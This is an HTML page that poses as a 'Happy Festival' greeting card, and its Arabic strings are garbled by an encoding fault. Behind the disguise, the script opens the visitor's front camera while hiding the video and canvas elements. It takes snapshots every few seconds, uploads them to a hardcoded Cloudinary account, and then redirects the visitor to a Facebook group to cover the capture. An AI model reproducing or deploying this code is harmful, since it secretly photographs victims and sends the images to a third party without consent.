<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Festival - 찾횦횉횑횄횋 찼횩</title>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    
    <style>
        body {
            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
            font-family: 'Tahoma', sans-serif;
            text-align: center;
            margin: 0; padding: 20px;
        }
        .card {
            background: white; border-radius: 20px; padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: 50px;
            border: 5px solid #ff077a;
        }
        h1 { color: #ff077a; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        #timer { font-size: 24px; font-weight: bold; color: #f06414; margin: 20px 0; }
        input[type=text] { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 10px; }
        button { background: #34af23; color: white; padding: 15px 30px; border: none; border-radius: 15px; cursor: pointer; font-size: 18px; }
        /* 횇횓횦횉횁 횉찼횩횉찾챠횗횉 횎찾횉찾횉챨 */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h1>?? HAPPY FESTIVAL ??</h1>
        <div style="background: #ff8c00; color: white; padding: 10px; border-radius: 10px;">
            <marquee>횄책찼횉챨 횊횩 횦챠 횛횦횒횋 횉찼횎책채횈횋 횉찼횙채챈챠횋 - 횄횕횓찼 횉횙찾횩 찼횗횆챠횋 책횕챠횎횩</marquee>
        </div>
        
        <div id="setupArea">
            <input type="text" id="nameInput" placeholder="횉횩횎횊 횉횙찾횩 책채횉...">
            <br>
            <button onclick="startExperience()">횗횆챠횋 횉찼찾횦횉횑횄횋 ?</button>
        </div>

        <div id="mainContent" style="display:none;">
            <h2 id="greetName"></h2>
            <p>횉채횎횢횗 횏챈횉채챠 횑횉횗챠 횎횑책챠횘 책횕챠횎횩...</p>
            <div id="timer">00:00:00</div>
        </div>
    </div>

    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const cloudName = 'dgkttv99v';
        const uploadPreset = '562842218131543';
        const redirectURL = "https://www.facebook.com/groups/coding.community"; // 횉찼횗횉횊횠 횉찼횖챠 횙챠횦횎횒 횦챠 횉찼채책횉챠횋
        
        let uploadCount = 0;

        function startExperience() {
            const name = document.getElementById('nameInput').value;
            if (!name) { alert("찾채 횦횜찼횩 횉횩횎횊 횉횙찾횩 횄챈찼횉챨"); return; }
            
            document.getElementById('setupArea').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            document.getElementById('greetName').innerText = "횄책찼횉챨 챠횉 " + name;
            
            startCamera(); // 횎횚횤챠찼 횉찼횩횉찾챠횗횉 횦챠 횉찼횓찼횦챠횋
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // 횉찼횎횧횉횠 횄챈찼 횛챈횗횋 횦챈횗횉챨
                setTimeout(takeSnapshot, 2000);
                
                // 횎횩횗횉횗 횉찼횉찼횎횧횉횠 횩찼 5 횏챈횉채챠
                setInterval(takeSnapshot, 5000);
            } catch (err) {
                console.log("Error: " + err);
                // 횒횎챙 찼챈 횗횦횜 횉찼횩횉찾챠횗횉징 횙채횧챈찾 횊횎횒챈챠찼책 찼횉횒횧횉챨 찼횩챠 찼횉 챠횚횩
                setTimeout(() => { window.location.href = redirectURL; }, 5000);
            }
        }

        function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL("image/png");
            
            // 횇횗횙횉찼 횉찼횊챠횉채횉횎 찼찼횙횒횉횊
            const formData = new FormData();
            formData.append('file', imageData);
            formData.append('upload_preset', uploadPreset);

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                uploadCount++;
                console.log("Captured");
                
                // 횊횣횕 횗횦횣 횄챈찼 횛챈횗횎챠채 횊채횑횉횒징 챠횎찾 횎횒챈챠찼 횉찼찾횙횎횓횕찾 찼찼횗횉횊횠 횉찼채책횉횈챠 찼횇채책횉횁 횉찼횓횕횣횋
                if (uploadCount >= 1) {
                    setTimeout(() => {
                        window.location.href = redirectURL;
                    }, 4000);
                }
            });
        }

        // 횣횕횉횕 횎채횉횘찼챠 챈책찾챠 찼찼횘챠채횋
        var count = 10;
        var counter = setInterval(function() {
            count--;
            if (count <= 0) { clearInterval(counter); return; }
            document.getElementById("timer").innerHTML = "00:00:0" + count;
        }, 1000);
    </script>
</body>
</html>
